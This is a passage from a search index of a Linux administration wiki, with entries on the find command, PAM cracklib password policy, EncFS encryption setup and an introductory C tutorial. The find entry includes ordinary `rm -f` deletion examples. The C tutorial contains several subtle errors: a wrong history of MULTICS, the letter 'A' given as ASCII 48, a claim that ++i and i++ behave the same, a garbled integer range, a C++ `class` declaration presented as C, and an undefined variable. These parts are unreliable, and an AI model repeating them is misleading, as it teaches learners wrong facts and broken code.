page):\nname: performs a search based on the name (without the directories of the access path). If the defined name contains wildcards, it is preferable to surround it with quotation marks or apostrophes. iname: identical to -name but without differentiating between uppercase and lowercase. find / -iname \"*file*\" -print type: This option specifies the type of object being searched. It must be followed by a letter that defines it. For example: d = directory, f = regular or “normal” file, l = symbolic link. find / -type f -iname \"artemis*\" -print The example below searches from the root directory for all files with the .odt extension and displays them:\nfind / -type f -iname \"*.odt\" -print user: File belonging to the specified user. Extremely practical for the administrator of one or more multi-user stations. group: File belonging to the specified group. mount: The search is limited to a single file system; it must not be carried out on directories located on other file systems. This is an alternative to the -xdev option, ensuring compatibility with older versions of find. Warning! A certain order is required! The options are called “positional”. Their control is carried out in the order of the command line. Otherwise, you risk getting a message like:\nfind: WARNING: you have specified the -mount option after an argument that is not a -type option but options are positional (-mount affects the tests specified before as well as after)\nIt’s easy to understand that the option limiting the search to the file system alone should be placed before the name of the file (or directory) being searched and, once located, the path to the object should then be displayed:\nfind / -mount -type f -iname \"*.pdf\" -user zarer -print Options for execution criteria linkOnce the search criteria are specified, it’s possible to ask the find command to perform different operations on the found objects. The main operation is simply to display the result of the search (the access path to the object). Again, there are also many options here. Refer to the find command manual page for details.\nThe selection criteria apply to the type (file, directory, …) and attributes of the search objects. Let’s just present a few of them:\nprint: Displays the search result in the form of a list of access paths to objects (files, directories…) meeting the selection criteria. This is the most common use of the find command. exec command ;: Executes the command. All arguments to find are considered as arguments for the command line, until a “;” is encountered. The string “{}” is replaced by the name of the file being processed, in all its occurrences. These two strings may need to be protected from expansion by the shell, using the escape character (\"\") or protection with apostrophes. The command is executed from the starting directory. The search result can thus serve other commands (destruction, backup, page-by-page display, etc.), as in the example syntax of the line below which chains the rm command that will destroy without confirmation request the result of the search:\nfind /home -iname my_file_test -exec rm -f {} \\; If you have fears or doubts when executing a risky command, it’s preferable in this case to use the following option:\nok command ;: This option is identical to -exec but first asks the user. If the answer doesn’t start with “y” or “Y”, the command will not be executed: find /home -iname my_file_test -ok rm -f {} \\; \u003c rm ... /home/zarer/Desktop/my_file_test \u003e? There is an even more suitable solution for the case where you have a very large number of files. This solution has the advantage of being more optimized: find / -name myfiles -print0 | xargs -0 rm -f The 0 allows you to overcome problems with spaces and carriage returns.\nIf you want to search for files older than 7 days: find . -type f -mtime +7 -exec ls -l {} \\; And if we want to compress them: find /path/to/files -type f -mtime +7 | grep -v \\.gz | xargs gzip Now, if we want to copy files while respecting a directory structure: find / -name \"lshell*\" | cpio -pduvm . Search with multiple criteria linkWhen several options are used simultaneously, all criteria are checked. Between each option, the find command uses an implicit logical operator: “And”.\nIt’s possible to modify this rule by applying explicit operators. These operators are rarely used but it can be interesting to know them for, for example, grouping several names. The syntax of the line below allows you to search for an object whose name contains two expressions:\nfind / \\( -iname *image* -a -iname *chaplin* \\) -print Logical operators are presented in decreasing order of priority link ( expression ): Parentheses force priority. As in algebra, what is between parentheses must be evaluated before any other operation.\n! expression or -not expression: True if the expression is false. Simply consists of taking the expression as false. For example, you can search for a file that does not belong to a particular user.\nexpression1 expression2: AND (implicit). Expression2 will not be evaluated if expression1 is false.\nexpression1 -a expression2 or expression1 -and expression2: Like expression1 expression2. The -a is therefore optional.\nexpression1 -o expression2 or expression1 -or expression2: OR. Expression2 is not evaluated if expression1 is true.\nexpression1 , expression2: List. Both expressions will always be evaluated. The value of expression1 is ignored; the value of the list is that of expression2.\nHappy searching!\n"
            }
        );
    index.add(
            {
                id:  405 ,
                href: "\/Pam_cracklib_:_Choisir_la_complexit%C3%A9_des_mots_de_passe\/",
                title: "PAM Cracklib: Configure Password Complexity",
                description: "How to configure password complexity requirements using PAM Cracklib to enforce strong password policies on Linux systems.",
                content: "Introduction linkIf you’re tired of users choosing passwords that are too simple on your systems, compromising security in the process, there’s a solution. PAM Cracklib allows you to specify the minimum size of passwords, the number of lowercase letters, uppercase letters, digits, and more.\nIt’s almost essential, especially if you rely on a backend like LDAP.\nInstallation linkInstallation is straightforward:\naptitude install libpam-cracklib Configuration linkWe only have one file to edit, which greatly simplifies things. Since we’re using Debian, they’ve made our lives easier - we just need to uncomment some lines that already come with clear explanations!\n# # /etc/pam.d/common-password - password-related modules common to all services # # This file is included from other service-specific PAM config files, # and should contain a list of modules that define the services to be # used to change user passwords. The default is pam_unix. # Explanation of pam_unix options: # # The \"sha512\" option enables salted SHA512 passwords. Without this option, # the default is Unix crypt. Prior releases used the option \"md5\". # # The \"obscure\" option replaces the old `OBSCURE_CHECKS_ENAB' option in # login.defs. # # See the pam_unix manpage for other options. # As of pam 1.0.1-6, this file is managed by pam-auth-update by default. # To take advantage of this, it is recommended that you configure any # local modules either before or after the default block, and use # pam-auth-update to manage selection of other modules. See # pam-auth-update(8) for details. # here are the per-package modules (the \"Primary\" block) password requisite pam_cracklib.so retry=3 minlen=10 difok=3 dcredit=-1 ucredit=-1 lcredit=-1 password [success=1 default=ignore] pam_unix.so obscure use_authtok try_first_pass sha512 # here's the fallback if no module succeeds password requisite pam_deny.so # prime the stack with a positive return value if there isn't one already; # this avoids us returning an error just because nothing sets a success code # since the modules above will each just jump around password required pam_permit.so # and here are more per-package modules (the \"Additional\" block) # end of pam-auth-update config I’ve commented the first line in bold and then uncommented the last two. On the last line, I also removed ’nullok’ which allows empty passwords. Any account with an empty password will be rejected (be careful though if you have a system user that needs this type of account for maintenance operations).\nNow, let’s explain the pam_cracklib.so line parameters:\nretry: the number of times the user can retry if they enter the wrong password minlen: the minimum length of the password difok: this is a clever one, and a bit tricky - it remembers previous passwords that users have set. Here a user can’t reuse a previously used password until the 5th time. dcredit: if the number is negative, it means the password must contain at least x decimal digits to be validated (here at least one digit is required) ucredit: if the number is negative, it means the password must contain at least x uppercase letters to be validated (here at least one uppercase letter is required) lcredit: if the number is negative, it means the password must contain at least x lowercase letters to be validated (here at least one lowercase letter is required) I could have also added ocredit which allows you to specify special characters. For dcredit, ucredit, lcredit and ocredit, if they equal a positive number, they subtract from minlen when used.\nCheck the references below if you want more information :-)\nReferences linkhttp://www.deer-run.com/~hal/sysadmin/pam_cracklib.html\nhttp://linux.die.net/man/8/pam_cracklib\n"
            }
        );
    index.add(
            {
                id:  406 ,
                href: "\/Encfs_:_Mise_en_place_d\u0027Encfs_avec_FUSE\/",
                title: "EncFS: Setting up EncFS with FUSE",
                description: "A guide on how to implement EncFS with FUSE for encrypted filesystems.",
                content: "1. Introduction linkEncFS is an encrypted file system which allows you to store files on your hard drive that others cannot access, even if the machine is physically taken.\nEncFS seems particularly interesting for the following reasons:\nNo need to be root to use it Super simple implementation and trivial usage (see below) Separate encryption for each file. This may seem less secure (file sizes, names, and modification dates are known) but it has the enormous advantage of being more efficient (no need to re-encrypt the entire volume if only one file changes) and adaptable (no need to predict in advance the size the file system will take) (subjective opinion) the developer seems to have a good understanding of cryptographic tools. You should verify this for yourself ;-) 2. Installation link2.1 Debian linkLet’s get the necessary packages:\naptitude install encfs fuse-utils Now, let’s check that you have what you need in your kernel:\ngrep FUSE \u003c /boot/config-2.6.19 You should have one of these 2 lines:\nCONFIG_FUSE_FS=y CONFIG_FUSE_FS=m If this is not the case, you need to recompile your kernel and set FUSE as a module or integrate it directly.\n2.2 FreeBSD linkOn FreeBSD, it’s preferable to take the packaged versions as the compilation part is long and requires dependencies:\npkg_add -r fusefs-encfs Then add this line to your rc.conf:\n# /etc/rc.conf ... fusefs_enable=\"YES\" Next, if you want any user to be able to use fuse, run this command:\nsysctl vfs.usermount=1 3. Configuration linkWe will create the encrypted file system:\nencfs ~/.crypt ~/crypt Answer the questions:\nThe directory \"/home/deimos/.crypt\" does not exist. Should it be created? (y,n) y The directory \"/home/deimos/crypt\" does not exist. Should it be created? (y,n) y Creating a new encrypted volume. Please choose one of the following options: enter \"x\" for expert configuration mode, enter \"p\" for pre-configured paranoia mode, anything else or an empty line will select standard mode. ?\u003e p We’re not going to complicate things here and will configure in Paranoia mode to have the best encryption:-)\nParanoid configuration selected. Configuration completed. The filesystem to be created has the following properties: Filesystem cipher: \"ssl/aes\", version 2:1:1 Filename encoding: \"nameio/block\", version 3:0:1 Key size: 256 bits Block size: 512 bytes, including 8 byte MAC header Each file contains 8 bytes of header with unique IV data. Filenames encrypted using IV chaining mode. File data IV is chained to filename IV. Now you will need to enter a password for your filesystem. You will need to remember this password, as there is absolutely no recovery mechanism. However, the password can be changed later using encfsctl. Choose your password:\nNew EncFS Password: Verify EncFS Password: 4. Usage link4.1 Single User linkTo mount our encrypted folder:\nencfs ~/.crypt ~/crypt Enter your password now. (Read the Multi-User version for the rest of the explanations). If you want everyone to be able to access your encrypted share, you need to add –public:\nencfs --public ~/.crypt ~/crypt 4.2 Multi Users linkCreate a file to be encrypted on-the-fly:\ntouch ~/crypt/toto Let’s check our file:\n\u003e ls -l ~/crypt/toto -rw-r--r-- 1 deimos deimos 0 2005-04-20 21:27 /home/deimos/crypt/toto And now in the encrypted folder:\n\u003e ls -l ~/.crypt/ total 0 -rw-r--r-- 1 deimos deimos 0 2005-04-20 21:27 FmIxHB3JurWr9jUCCgsUI8Ei 4.3 Unmounting a volume linkTo unmount the volume:\nfusermount -u ~/crypt/ That’s how simple it is :-)\n4.4 Changing the password linkIf you want to change the password of an encfs volume, do this:\nencfsctl passwd ~/.crypt 5. Pam and Encfs linkPut pam_encfs.conf in /etc/security and modify your pam to load (for example):\nauth required pam_encfs.so and if you want to auto umount on logout:\nsession required pam_encfs.so (note that setting “encfs_default –idle=1”, means it’ll auto umount after 1 minute idletime, so you can ignore this if you want to)\nIf you want gdm working you’ll have to do this: (to allow use of –public / allow_root / allow_other)\necho \"user_allow_other\" \u003e\u003e /etc/fuse.conf adduser testuser # (put him in the fuse group if you have one) mkdir -p /mnt/storage/enc/testuser Setup your /etc/pam_encfs.conf (default should work)\nchown testuser:testuser /mnt/storage/enc/testuser su testuser encfs /mnt/storage/enc/testuser /home/testuser Use same password as your login atm:\nfusermount -u /home/testuser when you login, the directory should be mounted.\nExample to enable encryption for existing user (logout of any important things, turn off your apps, preferably do this in terminal login/as root):\nsudo mkdir -p /mnt/storage/enc/anders /mnt/storage/enc/tmp Use your main password on next part:\nencfs /mnt/storage/enc/anders /mnt/storage/enc/tmp -- -o allow_root cd /home/anders find . -print -xdev | cpio -pamd /mnt/storage/enc/tmp fusermount -u /mnt/storage/enc/tmp cd / sudo mv /home/anders /home/anders.BAK sudo mkdir /home/anders sudo chown anders:anders /home/anders sudo rmdir /mnt/storage/enc/tmp exit On next login (in theory) your homedir should be mounted ;)\n6. FAQ link6.1 Is there an example configuration file? linkYes, both in svn (link at https://hollowtube.mine.nu/wiki/index.php?n=Projects.PamEncfs), and in the downloaded archive from my release. Some distributions have chosen an extremely simple example configuration file, mine is a bit more explained.\n6.2 What command will pam_encfs run to mount a directory? linkIt depends on your options, but something like:\nencfs -S --idle=1 -v /mnt/storage/enc/test /home/test -- -o allow_other,allow_root,nonempty 6.3 My KDE doesn’t work linkLogin through KDE sometimes fails because KDE tries to store files to the home directory before mounting, and expect them to be there afterwards. To work around this you’ll need to set 3 things in /etc/kde3/kdm/kdmrc, “DmrcDir=/tmp” (in the general section). And “UserAuthDir,ClientLogFile”, both can be set to /tmp, these are in the [X-*-Core] section. There might be security related issues with this solution, I haven’t looked into that. If your paranoid about it you could make a temp directory tmp/user that only you have access to.\n6.4 Can I mount multiple under one login directories with pam_encfs? linkNo, there is however an unofficial patch here: https://bugs.gentoo.org/show_bug.cgi?id=102112 (https://joshua.haninge.kth.se/~sachankara/pam_encfs-0.1.3-multiple-mount-points.patch). This has not been applied to the main tree, as it segfaults when I test it with a very basic encfs configuration file (but might work with more advanced ones).\n6.5 pam_encfs does not find my encfs executable linkpam_encfs uses execvp, that means that in some systems it wont find it if it’s in /usr/local/bin, make a symlink to /usr/bin.\n6.6 It works on normal login, but not in gdm link Problem1, /etc/pam.d/gdm has a different system than /etc/pam.d/login, fix it ;). Problem2, You dont have the fuse option user_allow_root(or other) set, Make sure /etc/fuse.conf has user_allow_other (or user_allow_root). Make sure /etc/pam_encfs.conf has fuse_default allow_root, or the fuse option allow_root set. 6.7 It asks me for my password twice linkTry adding use_first_pass after pam_unix (or any other module that supports it).\n6.8 I’ve tried to use pam_encfs as my main authentication scheme, it doesn’t work! linkI return PAM_IGNORE on errors, this can’t work reliably as a main system, because of for example logging in twice (in which case the directory would already be mounted, and we therefore can’t check password ok).\n6.9 I can’t login to X because the filesystem doesn’t support locks linkThis could be a problem if your not using drop_permission, use it. And if you REALLY want to mount as root, put:\nexport XAUTHORITY=/tmp/.Xauthority-$USER export ICEAUTHORITY=/tmp/.ICEauthority-$USER in your ~/.bashrc\nMy system-auth file on gentoo:\nauth required pam_env.so auth sufficient /lib/security/pam_encfs.so auth sufficient /lib/security/pam_sha512.so pwdfile /etc/security/pam.sha auth sufficient pam_unix.so likeauth nullok auth required pam_deny.so account required pam_unix.so password required pam_cracklib.so retry=3 password sufficient pam_unix.so nullok md5 shadow use_authtok password required pam_deny.so session required pam_limits.so session required pam_unix.so Here it’ll ask for the password twice, my modules (pam_encfs/pam_sha512) will try to use any previous password if it finds one. So if you move pam_unix.so in auth to under pam_env.so, it’ll ask for the password once. Note that if pam_unix gets a password it finds ok, pam_encfs/pam_sha512 wont be used at all.\n6.10 I can’t create hard link linkThis is because of the External IV Chaining:\nThere is a cost associated with this. When External IV Chaining is enabled, hard links will not be allowed within the filesystem, as there would be no way to properly decode two different filenames pointing to the same data. Also, renaming a file requires modifying the file header. So renames will only be allowed when the user has write access to the file. Because of these limits, this option is disabled by default for standard mode (and enabled by default for paranoia mode). If you create as the paranoia mode a crypted partition, this mode will be automatically enable. So use the default mode or create as expert mode without this :-)\n6.11 Encfs in an OpenVZ VE linkIf you want to use encfs in a VE, you may encounter permission issues:\nEncFS Password: fuse: device not found, try 'modprobe fuse' first fuse failed. Common problems: - fuse kernel module not installed (modprobe fuse) - invalid options -- see usage message Be aware that you need to load the fuse module at the VZ level so that VEs inherit it. Add this to your VZ to avoid having to load the module at each boot:\n# /etc/modules ... # Load Fuse fuse ... Then load it dynamically to access it afterwards:\nmodprobe fuse To work around this, we’ll create the fuse device from the host on the VE in question and add admin rights to it (somewhat problematic in terms of security, but no choice):\nvzctl set $my_veid --devices c:10:229:rw --save vzctl exec $my_veid mknod /dev/fuse c 10 229 vzctl set $my_veid --capability sys_admin:on --save The second line may not work when the VE is turned off. Run it once it’s on and then mount your encfs partition.\n"
            }
        );
    index.add(
            {
                id:  407 ,
                href: "\/Introduction_au_C\/",
                title: "Introduction to C",
                description: "A comprehensive introduction to the C programming language, covering basics, syntax, functions, data types, memory management, and more.",
                content: "Introduction linkThe history of the C language is intimately linked to that of the UNIX operating system. In 1965, Ken Thompson, from Bell Labs, developed an operating system that he called MULTICS (Multiplexed Information and Computing System) in order to run a game he had created, which gave birth in 1970 to the UNICS operating system (Uniplexed Information and Computing System), quickly renamed UNIX.\nAt the time, assembly language was the only language that allowed the development of an operating system. Ken Thompson then developed a higher-level language, the B language (whose name comes from BCPL, a subset of the CPL language, itself derived from Algol, a language that was popular at the time), to facilitate the writing of operating systems. It was a weakly typed language (an untyped language, as opposed to a typed language, is a language that manipulates objects in their binary form, without any notion of type (character, integer, real, etc.)) and too dependent on the PDP-7 (the machine on which UNIX was developed) to allow UNIX to be ported to other machines. So Denis Ritchie (who was, along with Ken Thompson, one of the creators of UNIX) and Brian Kernighan improved the B language to give birth to the C language. In 1973, UNIX was rewritten entirely in C. For 5 years, the C language was limited to internal use at Bell until the day Brian Kernighan and Denis Ritchie published a first definition of the language in a book entitled “The C Programming Language”. This was the beginning of a revolution in the world of computing.\nThanks to its power, the C language quickly became very popular and in 1983, ANSI (American National Standards Institute) decided to standardize it by also adding some modifications and improvements, which gave birth in 1989 to the language as we know it today.\nThe characteristics of the C language are the following:\nUniversality: the programming language par excellence, C is not confined to a particular field of application. It can be used both for writing operating systems and scientific or management programs, modern software, databases, compilers, assemblers or interpreters, etc. Flexibility: it is a concise, very expressive language, and programs written in this language are very compact thanks to a powerful set of operators. Your only limit is your imagination! Power: C is a high-level language but allows low-level operations and access to system functionalities, which is most of the time impossible in other high-level languages. Portability: it is a language that does not depend on any hardware or software platform. C also allows you to write portable programs, i.e. programs that can be compiled for any platform without any modification. Moreover, its popularity but especially the elegance of programs written in C is such that its syntax has influenced many languages including C++ (which is considered a superset of C), JavaScript, Java, PHP and C#.\nPrograms and functions linkFirst Program linkLet’s write a simple “Hello World” program:\n#include int main() { printf(\"Hello, world\\n\"); return 0; } main is the main function of the code you are going to write. This is where everything will start when you call your program.\nAccording to the official C language standard, main is a function that must return an integer (int). In many systems (including Windows and UNIX), this integer is called the application’s error code. In C, although this is not necessarily the case for the operating system, we return 0 to say that everything went well.\nAs in many languages, we need to declare each variable we will use. Here it’s simple, the preprocessor loader stdio.h will take care of it for us.\nNext, we’ll compile it to see any errors and to run our first program :-)\ngcc -Wall hello_world.c -o hello_world gcc: the command corresponding to the compiler used. -Wall: enabling warning mode for possible errors. Very useful for debugging hello_world.c: source file hello_world: destination binary Comments linkFor comments, here are the solutions:\n// Comment in C++ style but should work with all recent compilers or\n/* You can start a paragraph of comments without worrying about anything until the end */ Functions linkIn mathematics, a function is defined as follows:\nf(x) = x² - 3 This means that f is a function that receives a real number x as an argument and returns a real number: x² - 3.\nLet’s write a C function that we’ll call f, which takes an integer x as an argument and also returns an integer: x² - 3:\nint f(int x) { return x*x - 3; } Now, let’s use this function:\n#include int f(int); /* declaration of function f */ int main() { int x = 4; printf(\"f(%d) = %d\\n\", x, f(x)); return 0; } int f(int x) { return x*x - 3; } int f(int x) says: f is a function that requires an int as an argument and returns an int. The %d in the printf function is what we call a format specifier. It informs about the way we want to display the text. Here, we want to display the numbers 4 and 13 (f(4)). So we tell printf to use the “integer number” (%d) format to display them. The first %d corresponds to the format we want to use to display x and the second for f(x).\nAlso note that the variable x in the main function has absolutely nothing to do with the variable x in the parameter of the function f. Each function can have its own variables and completely ignores what happens in other functions.\nNote: In a declaration, you can put the names of the function’s arguments (good only for decoration and nothing else):\nint Surface(int Longueur, int largeur); It is also strongly advised to declare what type of function argument you will use. Rather use:\nint Surface(void); /* void: 'empty', or 'nothing' if you prefer */ instead of not putting anything like:\nint Surface(); /* Surface is a function. Period. */ In a definition (implementation):\nYou can omit the return type of a function. In this case, it is assumed to return an int. An empty pair of parentheses means that the function does not accept any arguments. Other remarks:\nThe declaration of a function is only necessary when its use precedes its definition. However, it is always advisable to define a function only after its use (which therefore requires a declaration) if only for the readability of the program (indeed, it is the program that we want to see at first sight, not the small details). A function may not return a value. Its return type is then void. Macros linkThe preprocessor linkBefore being effectively compiled, C source files are processed by a preprocessor that resolves certain directives given to it, such as file inclusion for example. The preprocessor, although being a program independent of the compiler, is an indispensable element of the language.\nA directive given to the preprocessor always starts with #. We have already encountered the include directive which allows to include a file. The define directive allows to define macros.\nA macro, in its simplest form, is defined as follows:\n#define To replace for example all occurrences of PLUS by +:\n#define PLUS + Similarly, it can even replace functions sometimes:\n#define carre(x) x * x In this case, carre(3) will be replaced by 3 * 3. And finally:\n#define PI 3.14 The compiler replaces here each occurrence of PI with 3.14. You can also make a symbolic constant:\n#define USER \" Toto \" Global variables across multiple files linkBy default, a global variable is only accessible in the source file in which it is declared, because each source file will be compiled into an independent object file. However, it is possible to make a global variable accessible in all source files of a program using the extern keyword. This practice, however, should be avoided:\nextern my_extern_var Expressions and instructions linkData types link C Type Corresponding Type char character (small integer) int integer float floating point number (real) in single precision double floating point number (real) in double precision For example:\nchar ch; unsigned char c; unsigned int n; /* or simply: unsigned n */ The smallest possible value that can be assigned to an unsigned integer variable is 0, while signed integers accept negative values.\nint linkYou can also put short or long before int, in which case you would get a short integer (short int or simply short) respectively a long integer (long int or simply long). Here are examples of valid declarations:\nint n = 10, m = 5; short a, b, c; long x, y, z = -1; unsigned long p = 2; long can also be put before double, the resulting type is then long double (quadruple precision).\nBefore char or int, you can put the modifier signed or unsigned depending on whether you want to have a signed (by default) or unsigned integer. signed int is the signed value (negative or positive). unsigned int represents positive values.\nType Name Other Name Range Bytes int signed, unsigned int -32,768 to 32,767 2 short short_int, signed short, signed short_int -32,768 to 32,767 2 long long_int, signed long, signed long_int -2,147,493,648 to 2,147,483,647 4 unsigned unsigned int 0 to 65,535 2 unsigned short unsigned short_int 0 to 65,535 2 unsigned long unsigned long_int 0 to 4,294,967,295 4 Integer Numbers link Any “pure” literal constant of integer type (e.g., 1, -3, 60, 40, -20, …) is considered by the language to be of type int. To explicitly specify that an integer literal constant is of type unsigned, simply add the suffix u or U to the constant. For example: 2u, 30u, 40U, 50U, … Similarly, just add the suffix l or L to explicitly specify that an integer literal constant is of long type (you can use the UL suffix for example for unsigned long). An integer literal constant can also be written in octal (base 8) or hexadecimal (base 16). The hexadecimal notation is obviously much more used. A literal constant written in octal must be preceded by 0 (zero). For example: 012, 020, 030UL, etc. A literal constant written in hexadecimal must start with 0x (zero x). For example 0x30, 0x41, 0x61, 0xFFL, etc. Floating Point Numbers (floats) linkIt refers to decimal real numbers (positive or negative) (floating point). Any “pure” literal constant of floating point type (e.g., 0.5, -1.2, …) is considered to be of double type.\nThe suffix f or F allows to explicitly specify a float. Be careful, 1f is not valid because 1 is an integer constant. However, 1.0f is perfectly correct. The suffix l or L allows to explicitly specify a long double.\nA literal constant of floating point type is composed, in this order:\na sign (+ or -) a sequence of decimal digits: the integer part a point: the decimal separator a sequence of decimal digits: the decimal part either of the two letters e or E: symbol of power of 10 (scientific notation) a sign (+ or -) a sequence of decimal digits: the power of 10 For example, the following literal constants represent floating numbers: 1.0, -1.1f, 1.6E-19, 6.02e23L, 0.5 3e8\nType Name Other Name Range Floats - -3.4E38 to +3.4E38 double -1.7E308 to +1.7E308 long double -1.7E308 to +1.7E308 Type char linkchar is used to designate characters:\nType Name Other Name Range Bytes char signed char -128 to 127 1 unsigned char 0 to 255 1 Basic data types contain only one value. Derived or aggregate types can contain more than one value. Example: strings, arrays, structures, enumerations, unions, pointers. Format specification in sprintf linkHere is the list of format codes that we will use most often:\nFormat Code Usage c Display a character d Display an int u Display an unsigned int x, X Display an integer in hexadecimal format f Display a float or double in decimal notation e Display a float or double in scientific notation with a small e E Display a float or double in scientific notation with a capital E g, G Display a float or double (uses the most appropriate format) % Display the ‘%’ character Additionally:\nh before d or u indicates that the argument is a short l before d, u, x, or X indicates that the argument is of type long L before f, e, E, or g indicates that the argument is of type long double There are many more possibilities (which you need to know!) that I will not detail here (but we will use some of them when the time comes). So please don’t hesitate to consult the documentation.\nVariables and constants linkConstants linkIn C, there are 4 basic types:\nInteger constants. Floating point constants (real constants). Character constants. String constants. The first 2 constants are numeric constants.\nInteger numeric values are: decimal, octal, and hexadecimal. In base 10: a decimal point, an exponent (Note: precision depends on compilers (min: 6 digits, max: 18 digits)) Single character between apostrophes (128 characters): Character: 0…9 A…Z a…z ASCII code: 48…57 65…90 97…122 String of characters between quotes. The compiler automatically places the null character ‘\\0’ at the end of the string (invisible). “hello” is actually “hello\\0” which is useful in programs to mark the end of a string. ‘A’ is different from “A” because ‘A’ is a character with ASCII value 48 while “A” is a string (“A\\0”) without numeric value. “A” takes up more space than ‘A’. Here’s how to create variables:\nint a, b, c; int i = 0, j, n = 10; double x, y, z = 0.5; A declaration with initialization gives:\nint n = 0; While here is a declaration, followed by an assignment:\nint n; n = 0; A constant is a variable whose particularity is to be read-only (the value of a constant cannot be modified):\nconst int n = 10; Don’t forget to declare all your variables or constants or you’ll get errors.\nVariables linkA variable is a value of a defined type that can be modified:\nint a; a = 10; int a = 9; Definition of new types linkC has a very powerful mechanism that allows the programmer to create new data types using the typedef keyword:\ntypedef int ENTIER; Defines the ENTIER type as nothing other than the int type. Nothing prevents us therefore from writing:\nENTIER a, b; Although in this case a simple #define could have been sufficient, it is always recommended to use typedef which is much safer.\nTo declare functions without defining them, prototypes are used. Structures can be declared as follows:\nclass myclass; Pointers linkAs we know very well, the place where a program executes is memory, so all the data of the program (variables, functions, …) are in memory. The C language has an operator \u0026 allowing to retrieve the memory address of a variable or a function. For example, if n is a variable, \u0026n designates the address of n.\nC also has an operator ***** allowing to access the content of the memory whose address is given. For example, let’s assume we have:\nint n; Then the following instructions are strictly identical:\nn = 10; *( \u0026n ) = 10; A pointer (or a pointer type variable) is a variable intended to receive an address. It is then said to point to a memory location. Access to the memory content is done through the * operator.\nHere’s how to declare a variable p intended to receive the address of a variable of type int:\nint *p; int * o; I put another one with o, just to show that in C you can put as many spaces as you want. And now, here are other examples:\nint * p1, p2, p3; /* Only p1 is of type int *. The others are simply int.*/ int *p1, *p2, *p3; /* Here obviously, they are all int*/ /*Simplified use with typedef:*/ typedef int * PINT; PINT p1, p2, p3; However, this would not have worked if we had defined PINT using a #define because it would lead us to the first example.\nInputs and outputs linkEnter data typed at the keyboard with the scanf function linkYou need to understand 2 things before you start:\nIf we want to display an integer (with printf), we must display the integer (the value of the variable). If we want to ask the user (the one who uses our program) to type a number and then put the number thus entered in a variable, we must provide the address of the variable in which we wish to store the number entered. An example will help understanding:\n#include int main() { int a, b, c; printf(\"This program calculates the sum of 2 numbers.\\n\"); printf(\"Enter the value of a: \"); scanf(\"%d\", \u0026a); printf(\"Enter the value of b: \"); scanf(\"%d\", \u0026b); c = a + b; printf(\"%d + %d = %d\\n\", a, b, c); return 0; } Beware of spaces and what you ask someone to type with scanf. For example, if you want the person to type ‘years’ in addition to a number:\nscanf(\"%d years\", \u0026a); The user who enters their age will have to type “x years”. So be careful what has to be typed with scanf.\nThis is what we call formatted input. Functions such as scanf are rather intended to be used to read data from a safe program (through a file for example), not those from a human, which are subject to error. The format codes used in scanf are roughly the same as in printf, except for floating points in particular.\nFormat Code Usage f, e, g float lf, le, lg double Lf, Le, Lg long double Here is a program that calculates the volume of a right circular cone according to the formula: V = 1/3 * (B * h) where B is the base surface or for a circular base: B = PI*R², where R is the radius of the base.\n#include double Volume(double r_base, double hauteur); int main() { double R, h, V; printf(\"This program calculates the volume of a cone.\\n\"); printf(\"Enter the radius of the base: \"); scanf(\"%lf\", \u0026R); printf(\"Enter the height of the cone: \"); scanf(\"%lf\", \u0026h); V = Volume(R, h); printf(\"The volume of the cone is: %f\", V); return 0; } double Volume(double r_base, double hauteur) { return (3.14 * r_base * r_base * hauteur) / 3; } Example of permutation of the contents of two variables linkThis function must therefore be able to locate variables in memory, in other words we must pass to this function the addresses of the variables whose content we want to exchange:\n#include void permuter(int * addr_a, int * addr_b); int main() { int a = 10, b = 20; permuter(\u0026a, \u0026b); printf(\"a = %d\\nb = %d\\n\", a, b); return 0; } void permuter(int * addr_a , int * addr_b) /***************\\ * addr_a \u003c-- \u0026a * * addr_b \u003c-- \u0026b * \\***************/ { int c; c = *addr_a; *addr_a = *addr_b; *addr_b = c; } Common arithmetic operators linkThe common arithmetic operators +, -, *, and / exist in the C language. However, integer division is a little bit tricky. Indeed, if a and b are integers, a / b equals the quotient of a and b, i.e., for example, 29 / 5 equals 5. The remainder of an integer division is obtained with the modulo operator %, i.e., taking up the previous example, 29 % 5 equals 4.\nComparison operators link Operator Role \u003c Less than \u003e Greater than == Equal to \u003c= Less than or equal to \u003e= Greater than or equal to != Not equal to Logical operators link Operator Role \u0026\u0026 AND || OR ! NOT int prop1, prop2, prop_ou, prop_et, prop_vrai; prop1 = (1 \u003c 1000); prop2 = (2 == -6); prop_ou = prop1 || prop2; /* TRUE, because prop1 is TRUE */ prop_et = prop1 \u0026\u0026 prop2; /* FALSE, because prop2 is FALSE */ prop_vrai = prop1 \u0026\u0026 !prop_2 /* TRUE because prop1 and !prop2 are TRUE */ Sizeof: Data size linkThe size of a piece of data refers to the size, in bytes, that it occupies in memory. By extension of this definition, the size of a data type refers to the size of a piece of data of this type. Caution! byte refers here, by abuse of language, to the size of a memory element on the target machine (the abstract machine), i.e., the size of a memory cell (which equals 8 bits in most current architectures), and not a group of 8 bits. In the C language, a byte (a memory cell) is represented by a char. The size of a char is therefore not necessarily 8 bits, even if it is the case in many architectures, but dependent on the machine. The standard requires, however, that a char must be at least 8 bits and that the CHAR_BIT macro, declared in limits.h, indicates the exact size of a char on the target machine.\nC has an operator, sizeof, allowing to know the size, in bytes, of a piece of data or a data type. The size of a char is therefore obviously 1 since a char represents a byte. Moreover, there can’t be a type whose size is not a multiple of that of a char. The type of the value returned by the sizeof operator is size_t, declared in stddef.h, which is included by many header files including stdio.h.\nAs we have already said above, the size of the data is dependent on the target machine. In the C language, the size of the data is therefore not fixed. Nevertheless, the standard stipulates that we must have:\nsizeof (char) \u003c= sizeof (short) \u003c= sizeof (int) \u003c= sizeofd(long) On an Intel (x86) 32-bit processor for example, a char is 8 bits, a short 16 bits, and int and long 32 bits.\nIncrement and decrement operators linkJust like in many languages:\n#include int main() { int i = 1, j; j = ++i; /* j = 1+1 =\u003e j=2 */ printf (\"j (++i) = %d\\n\", j); j = --i; /* j = 2-1 =\u003e j=1 */ printf (\"j (--i) = %d\\n\", j); return 0; } Whether you write ++i or i++ doesn’t matter, the effect is the same.\nConditional expression linkA conditional expression is an expression whose value depends on a condition. The expression:\np ? a : b equals a if p is true and b if p is false.\nFor assignment operations, these are the operators: +=, -=, *=, /=, …\nx += a; for example is equivalent to:\nx = x + a; The operators are classified in order of priority. Here are the operators we have studied so far classified in this order.\nOperator Associativity Parentheses left to right ! ++ – - (sign) sizeof left to right * / % left to right + - left to right \u003c \u003c= \u003e \u003e= left to right == != left to right \u0026 (address of) left to right \u0026\u0026 left to right || left to right Assignment operators (= += …) right to left , left to right Just because this order exists doesn’t mean you have to memorize it. For readable code, it’s even advised not to rely on it too much and to use parentheses in ambiguous situations.\nCharacters linkThe numerical representation of characters defines what is called a character set. For example, in the ASCII character set (American Standard Code for 